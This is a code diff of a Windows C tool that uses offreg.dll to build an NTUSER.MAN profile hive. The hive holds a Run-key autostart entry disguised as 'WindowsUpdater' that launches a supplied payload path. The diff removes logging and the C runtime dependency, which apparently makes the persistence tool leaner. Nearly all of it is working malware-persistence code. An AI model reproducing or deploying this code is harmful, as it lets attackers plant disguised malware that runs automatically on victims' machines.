@@ -1,110 +1,68 @@
 #include <windows.h>
-#include <stdio.h>
+#include <shellapi.h>
 
-typedef PVOID ORHKEY;
-typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
-typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
-typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
-typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);
-typedef LONG (WINAPI* pORCloseHive)(ORHKEY);
-typedef LONG (WINAPI* pORCloseKey)(ORHKEY);
-
-typedef struct {
-    pORCreateHive  CreateHive;
-    pORCreateKey   CreateKey;
-    pORSetValue    SetValue;
-    pORSaveHive    SaveHive;
-    pORCloseHive   CloseHive;
-    pORCloseKey    CloseKey;
-    HMODULE hMod;
-} OffregApi;
-
-BOOL InitOffreg(OffregApi* api) {
-    api->hMod = LoadLibraryA("offreg.dll");
-    if (!api->hMod) api->hMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
-    if (!api->hMod) api->hMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
-    if (!api->hMod) return FALSE;
-
-    api->CreateHive = (pORCreateHive)GetProcAddress(api->hMod, "ORCreateHive");
-    api->CreateKey  = (pORCreateKey)GetProcAddress(api->hMod, "ORCreateKey");
-    api->SetValue   = (pORSetValue)GetProcAddress(api->hMod, "ORSetValue");
-    api->SaveHive   = (pORSaveHive)GetProcAddress(api->hMod, "ORSaveHive");
-    api->CloseHive  = (pORCloseHive)GetProcAddress(api->hMod, "ORCloseHive");
-    api->CloseKey   = (pORCloseKey)GetProcAddress(api->hMod, "ORCloseKey");
-
-    if (!api->CreateHive || !api->CreateKey || !api->SetValue || !api->SaveHive || !api->CloseHive || !api->CloseKey) return FALSE;
-    return TRUE;
-}
-
-void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
-    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
-    RTL_OSVERSIONINFOW osvi = { 0 };
-    osvi.dwOSVersionInfoSize = sizeof(osvi);
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (hNtdll) {
-        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
-        if (pRtlGetVersion && pRtlGetVersion(&osvi) == 0) {
-            *pMajor = osvi.dwMajorVersion;
-            *pMinor = osvi.dwMinorVersion;
-            return;
-        }
-    }
-    *pMajor = 6; *pMinor = 1;
-}
-
-int main(int argc, char* argv[]) {
-    if (argc != 3) {
-        printf("Usage: %s <payload_path> <output_ntuser_man>\n", argv[0]);
-        return 1;
-    }
+// 核心逻辑：接收参数并生成文件
+int RealMain(int argc, char* argv[]) {
+    if (argc != 3) return 1;
 
     WCHAR payloadPath[MAX_PATH] = {0};
     WCHAR outputPath[MAX_PATH] = {0};
     MultiByteToWideChar(CP_ACP, 0, argv[1], -1, payloadPath, MAX_PATH);
     MultiByteToWideChar(CP_ACP, 0, argv[2], -1, outputPath, MAX_PATH);
 
-    OffregApi api = { 0 };
-    if (!InitOffreg(&api)) {
-        printf("[-] Failed to load offreg.dll.\n");
-        return 1;
-    }
+    HMODULE hMod = LoadLibraryA("offreg.dll");
+    if (!hMod) hMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
+    if (!hMod) hMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
+    if (!hMod) return 1;
 
-    DWORD osMajor, osMinor;
-    GetRealOsVersion(&osMajor, &osMinor);
-    printf("[*] Detected OS version: %lu.%lu\n", osMajor, osMinor);
+    typedef PVOID ORHKEY;
+    typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
+    typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
+    typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
+    typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);
+
+    pORCreateHive CreateHive = (pORCreateHive)GetProcAddress(hMod, "ORCreateHive");
+    pORCreateKey CreateKey = (pORCreateKey)GetProcAddress(hMod, "ORCreateKey");
+    pORSetValue SetValue = (pORSetValue)GetProcAddress(hMod, "ORSetValue");
+    pORSaveHive SaveHive = (pORSaveHive)GetProcAddress(hMod, "ORSaveHive");
+
+    if (!CreateHive || !CreateKey || !SetValue || !SaveHive) return 1;
 
     ORHKEY hHive = NULL;
-    if (api.CreateHive(&hHive) != ERROR_SUCCESS) {
-        printf("[-] ORCreateHive failed.\n");
-        return 1;
-    }
-
-    LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    LPCWSTR valueName  = L"WindowsUpdater";
+    if (CreateHive(&hHive) != ERROR_SUCCESS) return 1;
 
     ORHKEY hKey = NULL;
     DWORD dwDisposition;
-    
-    if (api.CreateKey(hHive, runKeyPath, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
-        api.CloseHive(hHive);
+    if (CreateKey(hHive, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
         return 1;
     }
 
-    if (api.SetValue(hKey, valueName, 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((wcslen(payloadPath) + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
-        api.CloseKey(hKey);
-        api.CloseHive(hHive);
+    int len = 0; while(payloadPath[len]) len++;
+    if (SetValue(hKey, L"WindowsUpdater", 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((len + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
         return 1;
     }
 
-    api.CloseKey(hKey);
-    
-    if (api.SaveHive(hHive, outputPath, osMajor, osMinor) != ERROR_SUCCESS) {
-        api.CloseHive(hHive);
-        return 1;
-    }
-    
-    api.CloseHive(hHive);
-
-    printf("[+] Successfully generated VALID NTUSER.MAN at: %s\n", argv[2]);
+    // 直接利用 Win7 内核版本，不调用 RtlGetVersion 减少复杂依赖
+    SaveHive(hHive, outputPath, 6, 1);
     return 0;
+}
+
+// 终极入口：完全脱离 C 运行库，自己接管程序起点
+void __stdcall EntryPoint() {
+    int argc = 0;
+    LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argc);
+    if (!argvW || argc != 3) {
+        ExitProcess(1);
+    }
+
+    // 手工将宽字符参数转换为窄字符
+    char arg1[MAX_PATH] = {0};
+    char arg2[MAX_PATH] = {0};
+    WideCharToMultiByte(CP_ACP, 0, argvW[1], -1, arg1, MAX_PATH, NULL, NULL);
+    WideCharToMultiByte(CP_ACP, 0, argvW[2], -1, arg2, MAX_PATH, NULL, NULL);
+    
+    char* argvA[3] = { (char*)"main.exe", arg1, arg2 };
+
+    RealMain(3, argvA);
+    ExitProcess(0);
 }
